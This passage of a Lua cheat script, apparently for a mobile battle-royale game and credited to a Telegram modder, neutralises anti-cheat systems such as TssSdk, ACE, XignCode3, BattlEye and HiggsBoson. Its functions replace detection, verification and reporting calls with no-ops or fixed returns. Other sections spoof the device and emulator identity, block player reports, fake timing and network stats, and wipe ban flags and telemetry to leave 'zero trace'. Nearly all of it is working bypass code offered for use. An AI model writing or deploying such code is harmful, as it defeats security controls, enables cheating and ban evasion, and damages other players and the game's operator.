            EmulatorDetect.ValidateEmulator = retTrue
        end
        
        -- TSS Emulator Check TG BY ~ @ASURVIPMOD.
        if _G.TssSdk then
            _G.TssSdk.IsEmulator = retFalse
            _G.TssSdk.CheckEmulator = retFalse
            _G.TssSdk.ReportEmulator = nop
        end
        
        -- System Properties TG BY ~ @ASURVIPMOD.
        if _G.SystemProperties then
            _G.SystemProperties.ro.kernel.qemu = "0"
            _G.SystemProperties.ro.product.device = "samsung"
            _G.SystemProperties.ro.product.model = "SM-G998B"
            _G.SystemProperties.ro.product.manufacturer = "samsung"
            _G.SystemProperties.ro.hardware = "exynos2100"
        end
        
        print("[BYPASS] ✅ Emulator Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 7. Tamper Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockTamperDetection()
    pcall(function()
        -- File Integrity Check  TG BY ~ @ASURVIPMOD.
        local FileIntegrity = import("FileIntegrity")
        if FileIntegrity then
            FileIntegrity.VerifyFile = retTrue
            FileIntegrity.CheckIntegrity = retTrue
            FileIntegrity.ReportTamper = nop
            FileIntegrity.ValidateFile = retTrue
            FileIntegrity.IsFileValid = retTrue
        end
        
        -- Pak File Verification TG BY ~ @ASURVIPMOD.
        local PakVerification = import("PakVerification")
        if PakVerification then
            PakVerification.VerifyPak = retTrue
            PakVerification.CheckPak = retTrue
            PakVerification.ReportPakError = nop
            PakVerification.ValidatePak = retTrue
            PakVerification.IsPakValid = retTrue
        end
        
        -- Memory Tamper Detection TG BY ~ @ASURVIPMOD.
        local MemoryTamper = import("MemoryTamper")
        if MemoryTamper then
            MemoryTamper.DetectTamper = retFalse
            MemoryTamper.ReportTamper = nop
            MemoryTamper.CheckTamper = retFalse
            MemoryTamper.ValidateMemory = retTrue
        end
        
        print("[BYPASS] ✅ Tamper Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 8. SpeedHack Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockSpeedHackDetection()
    pcall(function()
        -- Speed Hack Detection TG BY ~ @ASURVIPMOD.
        local SpeedHackDetect = import("SpeedHackDetect")
        if SpeedHackDetect then
            SpeedHackDetect.DetectSpeedHack = retFalse
            SpeedHackDetect.ReportSpeedHack = nop
            SpeedHackDetect.CheckSpeed = retTrue
            SpeedHackDetect.ValidateSpeed = retTrue
            SpeedHackDetect.IsSpeedHack = retFalse
        end
        
        -- Movement Verification TG BY ~ @ASURVIPMOD.
        local MovementVerify = import("MovementVerify")
        if MovementVerify then
            MovementVerify.VerifyMovement = retTrue
            MovementVerify.ReportAbnormalMovement = nop
            MovementVerify.CheckMovement = retTrue
            MovementVerify.ValidateMovement = retTrue
            MovementVerify.IsMovementValid = retTrue
        end
        
        -- Time Scale Check ကို TG BY ~ @ASURVIPMOD.
        local TimeScale = import("TimeScale")
        if TimeScale then
            TimeScale.CheckTimeScale = retTrue
            TimeScale.ReportTimeScale = nop
            TimeScale.ValidateTimeScale = retTrue
            TimeScale.IsTimeScaleValid = retTrue
        end
        
        print("[BYPASS] ✅ SpeedHack Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 9. ESP Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockESPDetection()
    pcall(function()
        -- ESP Detection  TG BY ~ @ASURVIPMOD.
        local ESPDetect = import("ESPDetect")
        if ESPDetect then
            ESPDetect.DetectESP = retFalse
            ESPDetect.ReportESP = nop
            ESPDetect.CheckESP = retFalse
            ESPDetect.ValidateESP = retTrue
            ESPDetect.IsESPDetected = retFalse
        end
        
        -- Wallhack Detection  TG BY ~ @ASURVIPMOD.
        local WallhackDetect = import("WallhackDetect")
        if WallhackDetect then
            WallhackDetect.DetectWallhack = retFalse
            WallhackDetect.ReportWallhack = nop
            WallhackDetect.CheckWallhack = retFalse
            WallhackDetect.ValidateWallhack = retTrue
            WallhackDetect.IsWallhackDetected = retFalse
        end
        
        -- Render Check TG BY ~ @ASURVIPMOD.
        local RenderCheck = import("RenderCheck")
        if RenderCheck then
            RenderCheck.CheckRender = retTrue
            RenderCheck.ReportRender = nop
            RenderCheck.ValidateRender = retTrue
            RenderCheck.IsRenderValid = retTrue
        end
        
        print("[BYPASS] ✅ ESP Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 10. NoRecoil Detection Blocking (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockNoRecoilDetection()
    pcall(function()
        -- NoRecoil Detection TG BY ~ @ASURVIPMOD.
        local NoRecoilDetect = import("NoRecoilDetect")
        if NoRecoilDetect then
            NoRecoilDetect.DetectNoRecoil = retFalse
            NoRecoilDetect.ReportNoRecoil = nop
            NoRecoilDetect.CheckRecoil = retTrue
            NoRecoilDetect.ValidateRecoil = retTrue
            NoRecoilDetect.IsNoRecoil = retFalse
        end
        
        -- Shoot Pattern Verification TG BY ~ @ASURVIPMOD.
        local ShootPattern = import("ShootPattern")
        if ShootPattern then
            ShootPattern.VerifyPattern = retTrue
            ShootPattern.ReportPattern = nop
            ShootPattern.CheckPattern = retTrue
            ShootPattern.ValidatePattern = retTrue
            ShootPattern.IsPatternValid = retTrue
        end
        
        print("[BYPASS] ✅ NoRecoil Detection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 11. Advanced Anti-Cheat Bypass (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function AdvancedAntiCheatBypass()
    pcall(function()
        -- Unreal Engine Anti-Cheat
        local UAntiCheat = import("UAntiCheat")
        if UAntiCheat then
            UAntiCheat.CheckCheat = retFalse
            UAntiCheat.ReportCheat = nop
            UAntiCheat.ValidateCheat = retTrue
            UAntiCheat.IsCheatDetected = retFalse
            UAntiCheat.DetectCheat = retFalse
            UAntiCheat.KickCheater = nop
            UAntiCheat.BanCheater = nop
        end
        
        -- Blueprint Anti-Cheat
        local BPAntiCheat = import("BPAntiCheat")
        if BPAntiCheat then
            BPAntiCheat.VerifyBlueprint = retTrue
            BPAntiCheat.ReportBlueprint = nop
            BPAntiCheat.CheckBlueprint = retTrue
            BPAntiCheat.ValidateBlueprint = retTrue
            BPAntiCheat.IsBlueprintValid = retTrue
        end
        
        -- Network Anti-Cheat
        local NetAntiCheat = import("NetAntiCheat")
        if NetAntiCheat then
            NetAntiCheat.VerifyNetwork = retTrue
            NetAntiCheat.ReportNetwork = nop
            NetAntiCheat.CheckNetwork = retTrue
            NetAntiCheat.ValidateNetwork = retTrue
            NetAntiCheat.IsNetworkValid = retTrue
        end
        
        print("[BYPASS] ✅ Advanced Anti-Cheat TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 12. Memory Protection Bypass (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function MemoryProtectionBypass()
    pcall(function()
        -- Memory Scanner ကို TG BY ~ @ASURVIPMOD.
        local MemoryScanner = import("MemoryScanner")
        if MemoryScanner then
            MemoryScanner.ScanMemory = retFalse
            MemoryScanner.ReportMemory = nop
            MemoryScanner.CheckMemory = retTrue
            MemoryScanner.ValidateMemory = retTrue
            MemoryScanner.IsMemoryValid = retTrue
        end
        
        -- Pointer Check ကို TG BY ~ @ASURVIPMOD.
        local PointerCheck = import("PointerCheck")
        if PointerCheck then
            PointerCheck.CheckPointer = retTrue
            PointerCheck.ReportPointer = nop
            PointerCheck.ValidatePointer = retTrue
            PointerCheck.IsPointerValid = retTrue
        end
        
        -- Heap Check ကို TG BY ~ @ASURVIPMOD.
        local HeapCheck = import("HeapCheck")
        if HeapCheck then
            HeapCheck.CheckHeap = retTrue
            HeapCheck.ReportHeap = nop
            HeapCheck.ValidateHeap = retTrue
            HeapCheck.IsHeapValid = retTrue
        end
        
        print("[BYPASS] ✅ Memory Protection TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 13. Player Report Bypass (New) TG BY ~ @ASURVIPMOD
-- ============================================================

local function PlayerReportBypass()
    pcall(function()
        -- Player Report System ကို TG BY ~ @ASURVIPMOD.
        local PlayerReport = import("PlayerReport")
        if PlayerReport then
            PlayerReport.ReportPlayer = nop
            PlayerReport.SendReport = nop
            PlayerReport.CheckReport = retFalse
            PlayerReport.ValidateReport = retTrue
            PlayerReport.IsReportValid = retTrue
        end
        
        -- Report Cooldown TG BY ~ @ASURVIPMOD.
        local ReportCooldown = import("ReportCooldown")
        if ReportCooldown then
            ReportCooldown.GetCooldown = retZero
            ReportCooldown.CheckCooldown = retTrue
            ReportCooldown.ResetCooldown = nop
            ReportCooldown.ValidateCooldown = retTrue
        end
        
        print("[BYPASS] ✅ Player Report TG BY ~ @ASURVIPMOD")
    end)
end

-- ============================================================
-- 14. Magic Bullet Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function MagicBulletBypass()
    pcall(function()
        print("[MAGIC BULLET BYPASS] Magic Bullet TG BY ~ @ASURVIPMOD....")
        
        -- Damage Verification TG BY ~ @ASURVIPMOD.
        local DamageVerification = import("DamageVerification")
        if DamageVerification then
            DamageVerification.VerifyDamage = retTrue
            DamageVerification.ReportAbnormalDamage = nop
            DamageVerification.CheckDamage = retTrue
            DamageVerification.ValidateDamage = retTrue
            DamageVerification.IsDamageValid = retTrue
            DamageVerification.ReportInvalidDamage = nop
            DamageVerification.ResetDamageData = nop
            print("[MAGIC BULLET BYPASS] ✅ Damage Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Hitbox Verification TG BY ~ @ASURVIPMOD.
        local HitboxVerification = import("HitboxVerification")
        if HitboxVerification then
            HitboxVerification.VerifyHitbox = retTrue
            HitboxVerification.ReportInvalidHit = nop
            HitboxVerification.CheckHitbox = retTrue
            HitboxVerification.ValidateHitbox = retTrue
            HitboxVerification.IsHitboxValid = retTrue
            HitboxVerification.ReportAbnormalHitbox = nop
            HitboxVerification.ResetHitboxData = nop
            print("[MAGIC BULLET BYPASS] ✅ Hitbox Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Projectile Verification TG BY ~ @ASURVIPMOD.
        local ProjectileVerification = import("ProjectileVerification")
        if ProjectileVerification then
            ProjectileVerification.VerifyProjectile = retTrue
            ProjectileVerification.ReportAbnormalProjectile = nop
            ProjectileVerification.CheckProjectile = retTrue
            ProjectileVerification.ValidateProjectile = retTrue
            ProjectileVerification.IsProjectileValid = retTrue
            ProjectileVerification.ReportInvalidProjectile = nop
            ProjectileVerification.ResetProjectileData = nop
            print("[MAGIC BULLET BYPASS] ✅ Projectile Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Bullet Verification TG BY ~ @ASURVIPMOD.
        local BulletVerification = import("BulletVerification")
        if BulletVerification then
            BulletVerification.VerifyBullet = retTrue
            BulletVerification.ReportAbnormalBullet = nop
            BulletVerification.CheckBullet = retTrue
            BulletVerification.ValidateBullet = retTrue
            BulletVerification.IsBulletValid = retTrue
            BulletVerification.ReportInvalidBullet = nop
            BulletVerification.ResetBulletData = nop
            print("[MAGIC BULLET BYPASS] ✅ Bullet Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Shoot Verification TG BY ~ @ASURVIPMOD.
        local ShootVerify = _safe_require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if ShootVerify then
            ShootVerify.OnShootVerifyFailed = nop
            ShootVerify.SendVerifyData = nop
            ShootVerify.ReportBulletHit = nop
            ShootVerify.UploadHitInfo = nop
            ShootVerify.VerifyShot = retTrue
            ShootVerify.CheckShoot = retTrue
            ShootVerify.ValidateShoot = retTrue
            ShootVerify.IsShootValid = retTrue
            ShootVerify.ReportInvalidShoot = nop
            ShootVerify.ResetShootData = nop
            print("[MAGIC BULLET BYPASS] ✅ Shoot Verification TG BY ~ @ASURVIPMOD!")
        end
        
        print("[MAGIC BULLET BYPASS] ✅ TG BY ~ @ASURVIPMOD. - Magic Bullet detection အားလုံး TG BY ~ @ASURVIPMOD!")
    end)
end

-- ============================================================
-- 15. Skin Mod Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function SkinModBypass()
    pcall(function()
        print("[SKIN MOD BYPASS] Skin Mod TG BY ~ @ASURVIPMOD....")
        
        -- Avatar Verification TG BY ~ @ASURVIPMOD.
        local AvatarUtils = import("AvatarUtils")
        if AvatarUtils then
            AvatarUtils.CheckIsWeaponInBlackList = retFalse
            AvatarUtils.IsValidAvatar = retTrue
            AvatarUtils.CheckAvatarIntegrity = retTrue
            AvatarUtils.ReportInvalidAvatar = nop
            AvatarUtils.VerifyAvatar = retTrue
            AvatarUtils.ValidateAvatar = retTrue
            AvatarUtils.IsAvatarValid = retTrue
            AvatarUtils.ResetAvatarData = nop
            print("[SKIN MOD BYPASS] ✅ Avatar Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Weapon Verification TG BY ~ @ASURVIPMOD.
        local WeaponVerification = import("WeaponVerification")
        if WeaponVerification then
            WeaponVerification.VerifyWeapon = retTrue
            WeaponVerification.ReportInvalidWeapon = nop
            WeaponVerification.CheckWeapon = retTrue
            WeaponVerification.ValidateWeapon = retTrue
            WeaponVerification.IsWeaponValid = retTrue
            WeaponVerification.ResetWeaponData = nop
            print("[SKIN MOD BYPASS] ✅ Weapon Verification TG BY ~ @ASURVIPMOD!")
        end
        
        -- Vehicle Verification TG BY ~ @ASURVIPMOD.
        local VehicleVerification = import("VehicleVerification")
        if VehicleVerification then
            VehicleVerification.VerifyVehicle = retTrue
            VehicleVerification.ReportInvalidVehicle = nop
            VehicleVerification.CheckVehicle = retTrue
            VehicleVerification.ValidateVehicle = retTrue
            VehicleVerification.IsVehicleValid = retTrue
            VehicleVerification.ResetVehicleData = nop
            print("[SKIN MOD BYPASS] ✅ Vehicle Verification TG BY ~ @ASURVIPMOD!")
        end
        
        print("[SKIN MOD BYPASS] ✅ TG BY ~ @ASURVIPMOD. - Skin Mod detection အားလုံး TG BY ~ @ASURVIPMOD!")
    end)
end

-- ============================================================
-- 16. Version Specific Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function VersionSpecificBypasses()
    pcall(function()
        -- GLOBAL Version
        if _G.IS_GLOBAL then
            if _G.TssSdk then
                _G.TssSdk.IsEmulator = retFalse
                _G.TssSdk.ScanMemory = retTrue
                _G.TssSdk.ReportData = nop
                _G.TssSdk.SendReport = nop
                _G.TssSdk.OnRecvData = nop
            end
            local Higgs = package.loaded["GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent"]
            if Higgs then
                Higgs.bIsEnable = false
                Higgs.bMHActive = false
                Higgs.bCallPreReplication = false
            end
            print("[BYPASS] ✅ Global Version TG BY ~ @ASURVIPMOD.")
        end
        
        -- KR Version
        if _G.IS_KR then
            if _G.TssSdk then
                _G.TssSdk.IsEmulator = retFalse
                _G.TssSdk.ScanMemory = retTrue
                _G.TssSdk.ReportData = nop
                _G.TssSdk.SendReport = nop
                _G.TssSdk.OnRecvData = nop
            end
            local Higgs = package.loaded["GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent"]
            if Higgs then
                Higgs.bIsEnable = false
                Higgs.bMHActive = false
                Higgs.bCallPreReplication = false
            end
            print("[BYPASS] ✅ KR Version TG BY ~ @ASURVIPMOD.")
        end
        
        -- TW Version
        if _G.IS_TW_VERSION then
            if _G.TssSdk then
                _G.TssSdk.IsEmulator = retFalse
                _G.TssSdk.ScanMemory = retTrue
                _G.TssSdk.ReportData = nop
                _G.TssSdk.SendReport = nop
                _G.TssSdk.OnRecvData = nop
            end
            local Higgs = package.loaded["GameLua.Mod.BaseMod.Common.Security.HiggsBosonComponent"]
            if Higgs then
                Higgs.bIsEnable = false
                Higgs.bMHActive = false
                Higgs.bCallPreReplication = false
            end
            print("[BYPASS] ✅ TW Version TG BY ~ @ASURVIPMOD.")
        end
    end)
end

-- ============================================================
-- 17. TSS SDK Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockTssSdk()
    pcall(function()
        local TssSdk = _G.TssSdk or package.loaded["TssSdk"]
        if TssSdk then
            TssSdk.OnRecvData = nop
            TssSdk.SendReportInfo = nop
            TssSdk.ScanMemory = retTrue
            TssSdk.IsEmulator = retFalse
            TssSdk.GetTssSdkReportInfo = retEmptyString
            TssSdk.ReportException = nop
            TssSdk.ReportData = nop
            TssSdk.CheckIntegrity = retTrue
            TssSdk.VerifySignature = retTrue
            TssSdk.CollectEvidence = retNil
            TssSdk.UploadLog = nop
            TssSdk.SendAntiData = nop
            TssSdk.ReportGameStart = nop
            TssSdk.ReportGameEnd = nop
            TssSdk.ReportCrash = nop
            TssSdk.ReportViolation = nop
            TssSdk.ReportSuspicious = nop
            TssSdk.ReportBan = nop
            TssSdk.ReportKick = nop
            TssSdk.ReportSuspend = nop
            TssSdk.ReportFlag = nop
            TssSdk.ReportInfo = nop
            TssSdk.ReportDebug = nop
            TssSdk.ReportError = nop
            TssSdk.ReportFatal = nop
            TssSdk.ReportMemory = nop
            TssSdk.ReportProcess = nop
            TssSdk.ReportModule = nop
            TssSdk.ReportThread = nop
            TssSdk.ReportFile = nop
            TssSdk.ReportNetwork = nop
            TssSdk.ReportDevice = nop
            TssSdk.ReportSystem = nop
            TssSdk.ReportGame = nop
            TssSdk.ReportUser = nop
            TssSdk.ReportAccount = nop
            TssSdk.ReportSession = nop
            TssSdk.ReportPerformance = nop
            TssSdk.ReportBattery = nop
            TssSdk.ReportTemperature = nop
            TssSdk.ReportFPS = nop
            TssSdk.ReportPing = nop
            TssSdk.ReportPacket = nop
            TssSdk.ReportCheat = nop
            TssSdk.ReportHack = nop
            TssSdk.ReportMod = nop
            TssSdk.ReportInject = nop
            TssSdk.ReportDebugger = nop
            TssSdk.ReportEmulator = nop
            TssSdk.ReportRoot = nop
            TssSdk.ReportJailbreak = nop
            TssSdk.ReportVM = nop
            TssSdk.ReportHook = nop
            TssSdk.ReportPatch = nop
            TssSdk.ReportTamper = nop
            TssSdk.ReportCorrupt = nop
            TssSdk.ReportInvalid = nop
            TssSdk.ReportSpoof = nop
            TssSdk.ReportFake = nop
            TssSdk.ReportClone = nop
            TssSdk.ReportDuplicate = nop
            TssSdk.ReportConflict = nop
            TssSdk.ReportOverlap = nop
            TssSdk.ReportMismatch = nop
            TssSdk.ReportInconsistent = nop
            TssSdk.ReportUnexpected = nop
            TssSdk.ReportUnknown = nop
        end
    end)
    print("[BYPASS] ✅ TSS SDK TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 18. ACE (Anti-Cheat Expert) Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockAce()
    pcall(function()
        local ace = _G.ace or package.loaded["libace.so"]
        if ace then
            ace.ReportData = nop
            ace.CheckIntegrity = retTrue
            ace.ScanMemory = retFalse
            ace.VerifyProcess = retTrue
            ace.CheckModule = retTrue
            ace.ReportViolation = nop
            ace.KickPlayer = nop
            ace.BanPlayer = nop
            ace.CollectInfo = retEmpty
            ace.SendReport = nop
            ace.ValidateClient = retTrue
            ace.CheckDebugger = retFalse
            ace.CheckEmulator = retFalse
            ace.CheckRoot = retFalse
            ace.ReportCheat = nop
            ace.ReportHack = nop
            ace.ReportMod = nop
            ace.ReportInject = nop
            ace.ReportHook = nop
            ace.ReportPatch = nop
            ace.ReportTamper = nop
            ace.ReportCorrupt = nop
            ace.ReportInvalid = nop
            ace.ReportSpoof = nop
            ace.ReportFake = nop
        end
    end)
    print("[BYPASS] ✅ ACE (Anti-Cheat Expert) TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 19. XignCode3 Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockXignCode()
    pcall(function()
        local XignCode = _G.XignCode or package.loaded["xigncode"]
        if XignCode then
            XignCode.SendReport = nop
            XignCode.CheckProcess = retTrue
            XignCode.VerifyIntegrity = retTrue
            XignCode.ScanModules = retEmpty
            XignCode.ReportException = nop
            XignCode.ValidateMemory = retTrue
            XignCode.CheckDebugger = retFalse
            XignCode.KickPlayer = nop
            XignCode.BanPlayer = nop
            XignCode.EncryptData = function(data) return data end
            XignCode.DecryptData = function(data) return data end
            XignCode.ReportCheat = nop
            XignCode.ReportHack = nop
            XignCode.ReportMod = nop
            XignCode.ReportInject = nop
            XignCode.ReportHook = nop
            XignCode.ReportPatch = nop
            XignCode.ReportTamper = nop
        end
    end)
    print("[BYPASS] ✅ XignCode3 TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 20. BattlEye Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockBattlEye()
    pcall(function()
        local BattlEye = _G.BattlEye or package.loaded["BattlEye"]
        if BattlEye then
            BattlEye.SendReport = nop
            BattlEye.KickPlayer = nop
            BattlEye.ValidatePlayer = retTrue
            BattlEye.CheckMemory = retTrue
            BattlEye.VerifyIntegrity = retTrue
            BattlEye.ReportViolation = nop
            BattlEye.ScanProcess = retTrue
            BattlEye.BanPlayer = nop
            BattlEye.CollectEvidence = retEmpty
            BattlEye.ReportCheat = nop
            BattlEye.ReportHack = nop
            BattlEye.ReportMod = nop
            BattlEye.ReportInject = nop
            BattlEye.ReportHook = nop
        end
    end)
    print("[BYPASS] ✅ BattlEye TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 21. JNI Anti-Cheat Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockJNIAntiCheat()
    pcall(function()
        local jni_ac = _G.JNI and _G.JNI.AntiCheat
        if jni_ac then
            jni_ac.CheckRoot = retFalse
            jni_ac.CheckEmulator = retFalse
            jni_ac.CheckDebugger = retFalse
            jni_ac.CollectInfo = retEmpty
            jni_ac.SendReport = nop
            jni_ac.Validate = retTrue
            jni_ac.CheckRootAccess = retFalse
            jni_ac.CheckEmulatorAccess = retFalse
            jni_ac.CheckDebuggerAccess = retFalse
            jni_ac.CheckMemoryAccess = retTrue
            jni_ac.CheckProcessAccess = retTrue
            jni_ac.CheckFileAccess = retTrue
            jni_ac.CheckNetworkAccess = retTrue
            jni_ac.CheckSystemAccess = retTrue
            jni_ac.CheckDeviceAccess = retTrue
            jni_ac.CheckAPIAccess = retTrue
            jni_ac.CheckSDKAccess = retTrue
            jni_ac.CheckLibraryAccess = retTrue
            jni_ac.CheckFrameworkAccess = retTrue
            jni_ac.CheckPackageAccess = retTrue
        end
    end)
    print("[BYPASS] ✅ JNI Anti-Cheat TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 22. Anti-Debugging and Emulator Detection Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockAntiDebugging()
    pcall(function()
        local DebuggerDetect = _G.DebuggerDetect or package.loaded["DebuggerDetect"]
        if DebuggerDetect then
            DebuggerDetect.IsDebuggerPresent = retFalse
            DebuggerDetect.CheckBreakpoint = retFalse
            DebuggerDetect.CheckTracer = retFalse
            DebuggerDetect.CheckDebug = retFalse
            DebuggerDetect.CheckDebugger = retFalse
            DebuggerDetect.DetectDebugger = retFalse
            DebuggerDetect.DetectBreakpoint = retFalse
            DebuggerDetect.DetectTracer = retFalse
            DebuggerDetect.DetectDebug = retFalse
        end

        local EmulatorDetect = _G.EmulatorDetect or package.loaded["EmulatorDetect"]
        if EmulatorDetect then
            EmulatorDetect.IsEmulator = retFalse
            EmulatorDetect.GetEmulatorType = retEmptyString
            EmulatorDetect.CheckVM = retFalse
            EmulatorDetect.Detect = retFalse
            EmulatorDetect.DetectEmulator = retFalse
            EmulatorDetect.DetectVM = retFalse
            EmulatorDetect.DetectVirtualMachine = retFalse
            EmulatorDetect.DetectEmulatorType = retEmptyString
        end
    end)
    print("[BYPASS] ✅ Anti-Debugging and Emulator Detection TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 23. Zero Trace Cleanup TG BY ~ @ASURVIPMOD
-- ============================================================

local function ZeroTraceCleanup()
    pcall(function()
        local suspiciousVars = {
            "bIsCheating", "bDetected", "bBanned", "SuspicionScore",
            "CheatDetected", "AntiCheatFlag", "IsHacking", "bReported",
            "TrustScore", "SecurityFlag", "ViolationLevel", "BanStatus",
            "bIsBan", "bIsKick", "bIsReported", "CheatCount",
            "ViolationCount", "SecurityScore", "TrustLevel",
            "bIsCheater", "bIsHacker", "bIsModder", "bIsInjector",
            "bIsHooker", "bIsPatcher", "bIsTamperer", "bIsCorrupter",
            "bIsInvalid", "bIsSpoofer", "bIsFaker", "bIsCloner",
            "bIsDuplicator", "bIsConflicter", "bIsOverlapper", "bIsMismatcher",
            "bIsInconsistent", "bIsUnexpected", "bIsUnknown", "bIsSuspicious",
            "bIsAbnormal", "bIsCorrupt", "bIsTampered", "bIsModified",
            "bIsInjected", "bIsHooked", "bIsPatched", "bIsSpoofed",
            "bIsFaked", "bIsCloned", "bIsDuplicated", "bIsConflicted",
            "bIsOverlapped", "bIsMismatched", "bIsInconsistent"
        }
        for _, var in ipairs(suspiciousVars) do _G[var] = nil end
        
        _G.TelemetryQueue = {}
        _G.LogQueue = {}
        _G.ReportQueue = {}
        _G.ExceptionQueue = {}
        _G.CrashQueue = {}
        _G.TraceQueue = {}
        
        _G.bTelemetryEnabled = false
        _G.bLoggingEnabled = false
        _G.bReportingEnabled = false
        _G.bExceptionReportingEnabled = false
        _G.bCrashReportingEnabled = false
        _G.bTracingEnabled = false
        
        collectgarbage("collect")
    end)
    print("[BYPASS] ✅ Zero Trace Cleanup Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 24. End Game Protection TG BY ~ @ASURVIPMOD
-- ============================================================

local function EndGameProtection()
    pcall(function()
        local ticker = _safe_require("common.time_ticker")
        if ticker and ticker.AddTimerLoop then
            ticker.AddTimerLoop(1.0, function()
                pcall(function()
                    local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
                    if GameplayData then
                        local pc = GameplayData.GetPlayerController()
                        if _isValid(pc) then
                            if pc.HiggsBoson then
                                pc.HiggsBoson.bMHActive = false
                                pc.HiggsBoson.bCallPreReplication = false
                            end
                            if pc.HiggsBosonComponent then
                                pc.HiggsBosonComponent.bMHActive = false
                                pc.HiggsBosonComponent.bCallPreReplication = false
                            end
                        end
                    end
                end)
            end, -1, 1.0)
        end
    end)
    print("[BYPASS] ✅ End Game Protection Activated TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 25. Memory Protection TG BY ~ @ASURVIPMOD
-- ============================================================

local function MemoryProtection()
    pcall(function()
        local MemoryProtect = import("MemoryProtect")
        if MemoryProtect then
            MemoryProtect.VirtualProtect = function(addr, size, protect) return true end
            MemoryProtect.IsMemoryReadable = function(addr) return false end
            MemoryProtect.IsMemoryWritable = function(addr) return false end
            MemoryProtect.CheckMemory = retTrue
            MemoryProtect.ProtectMemory = retTrue
            MemoryProtect.UnprotectMemory = retTrue
            MemoryProtect.ValidateMemory = retTrue
            MemoryProtect.VerifyMemory = retTrue
        end
        
        if _G.Memory then
            _G.Memory.IntegrityCheck = retTrue
            _G.Memory.VerifyModule = retTrue
            _G.Memory.CheckCRC = retTrue
            _G.Memory.ScanModifications = retFalse
        end
        
        if debug then
            debug.getinfo = function() return {} end
            debug.sethook = function() end
            debug.getlocal = function() return nil end
            debug.setlocal = function() end
            debug.getupvalue = function() return nil end
            debug.setupvalue = function() end
        end
    end)
    print("[BYPASS] ✅ Memory Protection Activated TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 26. Network Monitoring Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockNetworkMonitoring()
    pcall(function()
        local NetworkManager = import("NetworkManager")
        if NetworkManager then
            NetworkManager.GetNetworkStats = function() return {ping=40, loss=0, rtt=40} end
            NetworkManager.CapturePackets = function() end
            NetworkManager.AnalyzeTraffic = function() return {} end
            NetworkManager.GetConnectionInfo = function() return "127.0.0.1:8080" end
            NetworkManager.MonitorTraffic = function() end
            NetworkManager.ReportTraffic = function() end
            NetworkManager.ReportNetwork = function() end
            NetworkManager.ReportBandwidth = function() end
            NetworkManager.ReportLatency = function() end
            NetworkManager.ReportPacketLoss = function() end
        end
        
        if _G.Network then
            _G.Network.IsVPN = retFalse
            _G.Network.IsProxy = retFalse
            _G.Network.CheckNetworkType = function() return "WIFI" end
            _G.Network.IsNetworkError = retFalse
            _G.Network.ValidateConnection = retTrue
            _G.Network.VerifyNetwork = retTrue
            _G.Network.CheckLatency = function() return 20 end
            _G.Network.GetPacketLoss = function() return 0 end
            _G.Network.IsSuspicious = retFalse
            _G.Network.IsCompromised = retFalse
        end
    end)
    print("[BYPASS] ✅ Network Monitoring TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 27. Timing Check Spoofing TG BY ~ @ASURVIPMOD
-- ============================================================

local function TimingCheckSpoof()
    pcall(function()
        local Engine = import("Engine")
        if Engine then
            Engine.GetAverageFPS = function() return 60 end
            Engine.GetFrameTime = function() return 0.016 end
            Engine.IsLagging = retFalse
            Engine.GetDeltaTime = function() return 0.033 end
            Engine.GetTime = function() return os.time() end
            Engine.GetTimestamp = function() return os.time() end
            Engine.GetTick = function() return os.clock() end
            Engine.GetSeconds = function() return os.time() end
            Engine.GetMilliseconds = function() return os.time() * 1000 end
            Engine.GetMicroseconds = function() return os.time() * 1000000 end
        end

        local GameTime = package.loaded["GameLua.GameCore.Data.GameTime"]
        if GameTime then
            GameTime.GetServerTime = function() return os.time() end
            GameTime.GetDeltaTime = function() return 0.033 end
            GameTime.GetGameTime = function() return os.time() end
            GameTime.GetRealTime = function() return os.time() end
            GameTime.GetTickTime = function() return os.clock() end
            GameTime.GetFrameTime = function() return 0.016 end
        end
    end)
    print("[BYPASS] ✅ Timing Check Spoofing Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 28. Client Entry Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function ClientEntryBypass()
    pcall(function()
        if Client then
            Client.SetTssNetworkStatus = nop
            Client.GEMReportEnterLobbyEvent = nop
